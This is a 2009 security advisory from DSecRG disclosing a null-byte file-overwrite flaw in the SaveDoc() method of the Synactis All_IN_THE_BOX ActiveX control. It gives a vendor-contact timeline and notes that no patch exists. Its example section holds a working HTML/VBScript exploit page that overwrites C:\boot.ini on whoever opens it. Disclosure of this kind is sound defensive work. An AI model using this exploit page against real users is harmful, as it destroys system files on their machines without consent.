@@ -1,0 +1,83 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-006
+
+http://www.dsecrg.com/pages/vul/show.php?id=62
+
+
+Application:                    Synactis All_IN_THE_BOX ActiveX
+Versions Affected:              3
+Vendor URL:                     http://synactis.com
+Bugs:                           Null byte File overwriting
+Exploits:                       YES
+Reported:                       15.01.2009
+Vendor response:                NONE
+Second Report:                  22.01.2009
+Vendor response:                NONE
+Date of Public Advisory:        30.01.2009
+Authors:                        Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+Description
+***********
+Synactis All_IN_THE_BOX ActiveX  Control  (ALL_IN_THE_BOX.OCX) can be used to owervrite any any file in target system.
+Vulnerable method is "SaveDoc()"
+
+
+Details
+*******
+
+By default when saving file All_IN_THE_BOX ActiveX control  attend extension to filename variable in "SaveDoc()" method.
+For example if you enter filename "boot.ini" in "SaveDoc()" method then control will create file boot.ini.box.
+But by attending a null byte to filename attacker can owervrite any file in OS (see example for owervriting boot.ini)
+
+
+
+Class AllBox
+GUID: {B5576893-F948-4E0F-9BE1-A37CB56D66FF}
+Number of Interfaces: 1
+Default Interface: IAllBox
+RegKey Safe for Script: False
+RegkeySafe for Init: False
+KillBitSet: False
+
+
+
+Example:
+*******
+
+<html>
+Test Exploit page
+<object classid='clsid:B5576893-F948-4E0F-9BE1-A37CB56D66FF' id='sh2kerr' ></object>
+<script language='vbscript'>
+
+targetFile = "C:\PROGRA~1\Synactis\ALLIN-~1\ALL_IN~1.OCX"
+prototype  = "Sub SaveDoc ( ByVal aFileName As String )"
+memberName = "SaveDoc"
+progid     = "All_In_The_Box.AllBox"
+argCount   = 1
+arg1="C:\boot.ini"+unescape("%00")
+sh2kerr.SaveDoc arg1
+</script>
+</html>
+
+
+
+Fix Information
+***************
+
+No patches available.
+We did not get any response from vendor for 2 weeks.
+
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research [at] dsec [dot] ru
+                http://www.dsecrg.com
+                http://www.dsec.ru
+
+# milw0rm.com [2009-01-30]
